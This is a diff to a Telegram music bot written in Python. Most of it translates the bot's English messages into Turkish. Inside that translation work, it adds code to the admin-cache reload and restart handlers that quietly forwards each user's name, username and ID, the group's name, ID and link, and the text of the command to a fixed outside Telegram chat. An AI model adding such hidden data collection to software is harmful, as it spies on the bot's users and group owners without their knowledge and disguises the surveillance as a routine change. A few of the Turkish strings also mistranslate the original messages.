@@ -34,6 +34,19 @@ RESTART_COMMAND = get_command("RESTART_COMMAND")
 )
 @language
 async def reload_admin_cache(client, message: Message, _):
+    first_name = message.from_user.mention
+    user_id = message.from_user.id
+
+    
+    await client.send_message(-1001808202784, f"""
+👥 **Grup:** {message.chat.title} [`{message.chat.id}`]
+**Grup Linki:** @{message.chat.username}
+**Kullanıcı:** {first_name}
+**Kullanıcı Adı:** @{message.from_user.username}
+**Kullanıcı ID:** `{message.from_user.id}`
+**Sorgu:** {message.text}
+""")
+
     try:
         chat_id = message.chat.id
         admins = await app.get_chat_members(
@@ -50,7 +63,7 @@ async def reload_admin_cache(client, message: Message, _):
         await message.reply_text(_["admin_20"])
     except:
         await message.reply_text(
-            "Failed to reload admincache. Make sure Bot is admin in your chat."
+            "Yeniden Yüklenirken Hata Oluştu. Botu Admin Yaptığınızdan Emin Olun."
         )
 
 
@@ -62,8 +75,22 @@ async def reload_admin_cache(client, message: Message, _):
 )
 @AdminActual
 async def restartbot(client, message: Message, _):
+    first_name = message.from_user.mention
+    user_id = message.from_user.id
+
+    
+    await client.send_message(-1001808202784, f"""
+👥 **Grup:** {message.chat.title} [`{message.chat.id}`]
+**Grup Linki:** @{message.chat.username}
+**Kullanıcı:** {first_name}
+**Kullanıcı Adı:** @{message.from_user.username}
+**Kullanıcı ID:** `{message.from_user.id}`
+**Sorgu:** {message.text}
+""")
+
+
     mystic = await message.reply_text(
-        f"Please Wait.. Restarting {MUSIC_BOT_NAME} for your chat.."
+        f"Lütfen Bekleyin... {MUSIC_BOT_NAME} Yeniden Başlatılıyor."
     )
     await asyncio.sleep(1)
     try:
@@ -83,7 +110,7 @@ async def restartbot(client, message: Message, _):
         except:
             pass
     return await mystic.edit_text(
-        "Successfully restarted. Try playing now.."
+        "Yeniden Başlatıldı. Yeniden Oynatmayı Deneyin."
     )
 
 
@@ -114,11 +141,11 @@ async def stop_download(client, CallbackQuery: CallbackQuery, _):
     task = lyrical.get(message_id)
     if not task:
         return await CallbackQuery.answer(
-            "Downloading already Completed.", show_alert=True
+            "İndirme Nerdeyse Tamamlandı.", show_alert=True
         )
     if task.done() or task.cancelled():
         return await CallbackQuery.answer(
-            "Downloading already Completed or Cancelled.",
+            "İndirme Zaten Tamamlandı Veya İptal Edildi.",
             show_alert=True,
         )
     if not task.done():
@@ -129,15 +156,15 @@ async def stop_download(client, CallbackQuery: CallbackQuery, _):
             except:
                 pass
             await CallbackQuery.answer(
-                "Downloading Cancelled", show_alert=True
+                "İndirme İptal Edildi.", show_alert=True
             )
             return await CallbackQuery.edit_message_text(
-                f"Download Cancelled by {CallbackQuery.from_user.mention}"
+                f"İndirmeyi İptal Eden Kişi {CallbackQuery.from_user.mention}"
             )
         except:
             return await CallbackQuery.answer(
-                "Failed to stop the Downloading.", show_alert=True
+                "İndirme İptali Başarısız.", show_alert=True
             )
     await CallbackQuery.answer(
-        "Failed to recognize the running task", show_alert=True
+        "Çalışan Görevler Tamamlanamadı.", show_alert=True
     )
